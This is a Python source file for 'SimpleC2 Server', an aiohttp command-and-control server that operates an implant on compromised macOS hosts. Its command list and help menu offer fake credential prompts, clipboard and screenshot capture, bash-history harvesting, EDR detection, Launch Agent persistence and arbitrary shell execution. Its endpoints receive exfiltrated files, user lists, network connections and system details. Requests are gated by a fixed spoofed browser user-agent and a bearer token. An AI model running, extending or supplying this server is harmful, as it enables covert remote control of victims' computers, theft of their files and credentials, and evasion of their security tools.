from aiohttp import web
from datetime import datetime
import logging
import subprocess


cmds = []

commands = [
    'exit',
    'lcwd',
    'pwd',
    'download',
    'cat',
    'listdir',
    'whoami',
    'connections',
    'addresses',
    'listusers',
    'userhist',
    'screenshot',
    'checksecurity',
    'persist',
    'unpersist',
    'prompt',
    'systeminfo',
    'clipboard',
    'shell ',
    'sleep '
]


print("\033[1;36m+=====================================================================+")
print("SimpleC2 Server")
print("01010011 01101001 01101101 01110000 01101100 01100101 01000011 00110010")
print("+=====================================================================+\033[0m")

def validate_request(headers):
    UAgent = headers.get('User-Agent')
    token = headers.get('Authorization')
    if (
        UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36" and
        # len(token) == 266 and
        token.startswith("Bearer YOUR_SECRET_KEY")
    ):
        return True
    logging.warning("Invalid request: User-Agent=%s, Token=%s", UAgent, token)
    return False

async def InitCall(request):
    headers = request.headers
    if validate_request(headers):
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()


async def CheckIn(request):
    cmds.clear()
    peername = request.transport.get_extra_info('peername')
    host, port = peername
    cmdcounter = 0
    count = 0
    text = "OK"
    headers = request.headers
    if validate_request(headers):
        while True:
            command = input(f"\033[34m[Source: {peername}]>>>\033[0m ")
            if 'help' in command:
                print("-"*100)
                print("\033[33mHelp menu:\033[0m")
                print("--->ALIASES<---")
                print(">\033[33msysteminfo\033[0m: Return useful system information")
                print(">\033[33mcd [directory]\033[0m: cd to the directory specified (ex: cd /home)")
                print(">\033[33mlistdir\033[0m: list files and directories")
                print(">\033[33mdownload [filename]\033[0m: after you cd to directory of interest, download files of interest (one at a time)")
                print(">\033[33mlistusers\033[0m: List users")
                print(">\033[33maddresses\033[0m: List internal address(es) for this host")
                print(">\033[33mlcwd: Show current server working directory")
                print(">\033[33mpwd: Show working directory on host")
                print('')
                print("--->COMMANDS<---")
                print(">\033[33mprompt\033[0m: Propmpt the user to enter credentials")
                print(">\033[33muserhist\033[0m: Grep for interesting hosts from bash history")
                print(">\033[33mclipboard\033[0m: Grab text in the user's clipboard")
                print(">\033[33mconnections\033[0m: Show active network connections")
                print(">\033[33mchecksecurity\033[0m: Search for common EDR products")
                print(">\033[33mscreenshot\033[0m: Grap a screenshot of the OSX host")
                print(">\033[33msleep [digit]\033[0m: Change sleep time")
                print(">\033[33mpersist\033[0m: Add persistence as OSX Launch Agent. NOTE: This command must be run in the same directory where the macshell client is running.")
                print(">\033[33munpersist\033[0m: Remove the login persistence")
                print(">\033[33mshell [shell command]\033[0m: Run a shell command...NOT OPSEC SAFE, as this uses easily detectable command line strings")
                print('')
                print("--->OTHER<---")
                print(">\033[33mIn general enter whatever Mac OS shell command you want to run. Ex: whoami, hostname, pwd, etc.\033[0m")
                print(">\033[33mexit\033[0m: Exit the session and stop the client")
                print("-"*100)

            elif command == "lcwd":
                cwd = subprocess.run("pwd",shell=True,text=True,capture_output=True)
                print("Current server working directory:")
                print(f"\033[032m{cwd.stdout}\33[0m")

            elif any(command.startswith(cmd) for cmd in commands):
                cmdcounter += 1
                cmds.append(command)
                print(f"\033[33m{command} queued for execution on the endpoint\033[0m")
            
            elif 'done'==command:
                return web.json_response(cmds)

            else:
                print("\033[31m[-] Command not found\033[0m")
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()
    
async def GetDownload(request):
    if validate_request(request.headers):
        ddata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        if ddata.startswith(b"Error:"):
            print(f"\033[31m[-]{ddata.decode()}\033[0m")
        else:
            with open(f"download{timestmp}", 'wb') as file:
                file.write(ddata)
                file.close()
                print("\033[32m[+] File download complete\033[0m]")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def GetPath(request):
    if validate_request(request.headers):
        path = await request.read()
        timestamp = datetime.now
        print(f"Timestamp: {timestamp}")
        if path.startswith(b"Error"):
            print(f"\033[31m[-]{path.decode()}\033[0m")
        else:
            print(f"\033[32m[+] Current client directory path:\033[0m {path.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()
    
async def ListDir(request):
    if validate_request(request.headers):
        list_dir = await request.read()
        timestamp = datetime.now()
        print(f"Timestamp: {timestamp}")
        if list_dir.startswith(b"Error:"):
            print(f"\033[31m[-] {list_dir.decode()}\033[0m")
        else:
            print(f"\033[32m[+] List of directory:\033[0m {list_dir.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Whoami(request):
    if validate_request(request.headers):
        wdata = await request.read()
        timestamp = datetime.now()
        print(f"Timestamp: {timestamp}")
        if wdata.startswith(b"Error:"):
            print(f"\033[31m[-] {wdata.decode()}\033[0m")
        else:
            print(f"\033[32m[+] Current user identity:\033[0m {wdata.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Addresses(request):
    if validate_request(request.headers):
        addresses = await request.read()
        timestamp = datetime.now()
        print(f"Timestamp: {timestamp}")
        if addresses.startswith(b"Error:"):
            print(f"\033[31m[-] {addresses.decode()}\033[0m")
        else:
            print("\033[32m[+] Current user identity:\033[0m ")
            print(f"{addresses.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def SysInfo(request):
    if validate_request(request.headers):
        sys_info = await request.read()
        timestamp = datetime.now()
        print(f"Timestamp: {timestamp}")
        if sys_info.startswith(b"Error:"):
            print(f"\033[31m[-] {sys_info.decode()}\033[0m")
        else:
            print("\033[32m[+] \033[0m ")
            print(f"{sys_info.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ListUsers(request):
    if validate_request(request.headers):
        users = await request.read()
        timestamp = datetime.now()
        print(f"Timestamp: {timestamp}")
        if users.startswith(b"Error:"):
            print(f"\033[31m[-] {users.decode()}\033[0m")
        else:
            print("\033[32m[+] Local User Accounts Found: \033[0m ")
            print(f"{users.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Connections(request):
    if validate_request(request.headers):
        connections = await request.read()
        timestamp = datetime.now()
        print(f"Timestamp: {timestamp}")
        if connections.startswith(b"Error:"):
            print(f"\033[31m[-] {connections.decode()}\033[0m")
        else:
            print("\033[32m[+] Active network connection: \033[0m ")
            print(f"{connections.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()
    
async def CatFile(request):
    if validate_request(request.headers):
        cat_file = await request.read()
        timestamp = datetime.now()
        print(f"Timestamp: {timestamp}")
        if cat_file.startswith(b"Error:"):
            print(f"\033[31m[-] {cat_file.decode()}\033[0m")
        else:
            print("\033[32m[+] File Content: \033[0m ")
            print(f"{cat_file.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def UserHist(request):
    if validate_request(request.headers):
        user_hist = await request.read()
        timestamp = datetime.now()
        print(f"Timestamp: {timestamp}")
        if user_hist.startswith(b"Error:"):
            print(f"\033[31m[-] {user_hist.decode()}\033[0m")
        else:
            print("\033[32m[+] File Content: \033[0m")
            print(f"{user_hist.decode()}")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

app = web.Application()
app.add_routes([
    web.get('/initcall',InitCall),
    web.get('/check-in',CheckIn),
    web.post('/download',GetDownload),
    web.post('/path',GetPath),
    web.post('/listdir',ListDir),
    web.post('/whoami',Whoami),
    web.post('/addresses',Addresses),
    web.post('/sysinfo',SysInfo),
    web.post('/listusers',ListUsers),
    web.post('/connections',Connections),
    web.post('/catfile',CatFile),
    web.post('/userhist',UserHist)
])

if __name__ == "__main__":  
    web.run_app(app)